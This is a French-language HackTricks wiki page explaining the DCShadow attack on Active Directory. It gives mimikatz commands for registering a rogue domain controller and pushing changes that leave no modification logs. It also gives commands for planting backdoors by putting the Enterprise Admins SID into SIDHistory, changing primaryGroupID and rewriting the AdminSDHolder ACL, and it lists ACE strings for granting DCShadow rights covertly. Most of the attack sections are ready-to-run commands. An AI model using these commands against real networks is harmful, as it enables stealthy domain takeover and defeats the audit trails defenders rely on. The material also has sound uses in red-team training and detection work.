<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>


# DCShadow

Il enregistre un **nouveau contrôleur de domaine** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous avez besoin de privilèges DA et devez être dans le **domaine racine**.\
Notez que si vous utilisez de mauvaises données, des logs assez laids apparaîtront.

Pour effectuer l'attaque, vous avez besoin de 2 instances de mimikatz. L'une d'elles démarrera les serveurs RPC avec des privilèges SYSTEM (vous devez indiquer ici les modifications que vous souhaitez effectuer), et l'autre instance sera utilisée pour pousser les valeurs :

{% code title="mimikatz1 (serveurs RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Nécessite DA ou similaire" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Notez que **`elevate::token`** ne fonctionnera pas dans la session `mimikatz1` car cela élève les privilèges du thread, mais nous devons élever le **privilège du processus**.\
Vous pouvez également sélectionner un objet "LDAP": `/object:CN=Administrateur,CN=Utilisateurs,DC=JEFFLAB,DC=local`

Vous pouvez pousser les modifications à partir d'un DA ou d'un utilisateur avec ces autorisations minimales:

* Dans l'**objet de domaine**:
* _DS-Install-Replica_ (Ajouter/Supprimer une réplique dans le domaine)
* _DS-Replication-Manage-Topology_ (Gérer la topologie de réplication)
* _DS-Replication-Synchronize_ (Synchronisation de réplication)
* L'objet des **Sites** (et ses enfants) dans le **conteneur de configuration**:
* _CreateChild et DeleteChild_
* L'objet de l'**ordinateur enregistré en tant que DC**:
* _WriteProperty_ (Pas Write)
* L'**objet cible**:
* _WriteProperty_ (Pas Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour donner ces privilèges à un utilisateur non privilégié (notez que cela laissera des journaux). C'est beaucoup plus restrictif que d'avoir des privilèges DA.\
Par exemple: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Cela signifie que le nom d'utilisateur _**student1**_ lorsqu'il est connecté à la machine _**mcorp-student1**_ a des autorisations DCShadow sur l'objet _**root1user**_.

## Utilisation de DCShadow pour créer des portes dérobées

{% code title="Définir les administrateurs d'entreprise dans SIDHistory sur un utilisateur" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Changer PrimaryGroupID (mettre l'utilisateur en tant que membre des administrateurs de domaine)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modifier ntSecurityDescriptor d'AdminSDHolder (accorder le contrôle total à un utilisateur)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Ombreception - Donner des autorisations DCShadow en utilisant DCShadow (pas de journaux de modifications des autorisations)

Nous devons ajouter les ACE suivants avec le SID de notre utilisateur à la fin :

* Sur l'objet de domaine :
  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Sur l'objet ordinateur de l'attaquant : `(A;;WP;;;UserSID)`
* Sur l'objet utilisateur cible : `(A;;WP;;;UserSID)`
* Sur l'objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l'ACE actuel d'un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Remarquez que dans ce cas, vous devez apporter **plusieurs modifications,** pas seulement une. Ainsi, dans la session **mimikatz1** (serveur RPC), utilisez le paramètre **`/stack` avec chaque modification** que vous souhaitez apporter. De cette manière, vous n'aurez besoin de faire un seul **`/push`** pour effectuer toutes les modifications en attente sur le serveur malveillant.



[**Plus d'informations sur DCShadow sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
